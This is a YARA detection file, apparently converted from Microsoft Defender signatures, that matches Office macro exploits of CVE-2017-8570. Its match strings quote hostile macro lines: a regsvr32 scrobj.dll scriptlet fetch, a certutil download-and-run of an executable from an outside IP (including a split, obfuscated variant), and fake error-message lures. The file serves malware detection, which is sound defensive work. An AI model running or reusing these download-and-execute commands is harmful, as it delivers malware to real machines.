rule Exploit_O97M_CVE_2017_8570_2147741848_0
{
    meta:
        author = "defender2yara"
        detection_name = "Exploit:O97M/CVE-2017-8570!MTB"
        threat_id = "2147741848"
        type = "Exploit"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "CVE-2017-8570"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell.Run(\"regsvr32 /u /n /s /i:http://127.0.0.1/payloooad.sct scrobj.dll\", 0, False)" ascii //weight: 1
        $x_1_2 = "Call MsgBox(\"Houston, we've had a problem!\" & vbNewLine & \"Microsoft Word processing error.\"" ascii //weight: 1
        $x_1_3 = "\"Fatal error!\")" ascii //weight: 1
        $x_1_4 = "Dim shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Exploit_O97M_CVE_2017_8570_2147741848_1
{
    meta:
        author = "defender2yara"
        detection_name = "Exploit:O97M/CVE-2017-8570!MTB"
        threat_id = "2147741848"
        type = "Exploit"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "CVE-2017-8570"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "/u /n /s /i:http://185.104.114.115/1.sct scrobj.dll\", 0, False)" ascii //weight: 4
        $x_4_2 = ".Run (\"cmd.exe /c certutil.exe -urlcache -split -f http://185.104.114.115/123.exe sdfsdf.exe && start sdfsdf.exe\")" ascii //weight: 4
        $x_4_3 = ".Run (\"cmd.exe /c cer\" + \"tutil.exe -url\" + \"cache -sp\" + \"lit -f http://185.104.114.115/123.exe sdfsdf.exe && start" ascii //weight: 4
        $x_1_4 = "Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\ro\" + \"ot\\default:\" + \"StdRegProv\")" ascii //weight: 1
        $x_1_5 = "msg = \"This application appears to be made not supported format. [Error Code: -229]" ascii //weight: 1
        $x_1_6 = "Dim sheasdll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 3 of ($x_1_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Exploit_O97M_CVE_2017_8570_CS_2147745498_0
{
    meta:
        author = "defender2yara"
        detection_name = "Exploit:O97M/CVE-2017-8570.CS!eml"
        threat_id = "2147745498"
        type = "Exploit"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "CVE-2017-8570"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub auTOopeN()" ascii //weight: 1
        $x_1_2 = ": Call KYQysSSECVcjBXnJ" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 20 56 42 41 2e 53 68 65 6c 6c 24 28 [0-15] 2e [0-18] 2e [0-25] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

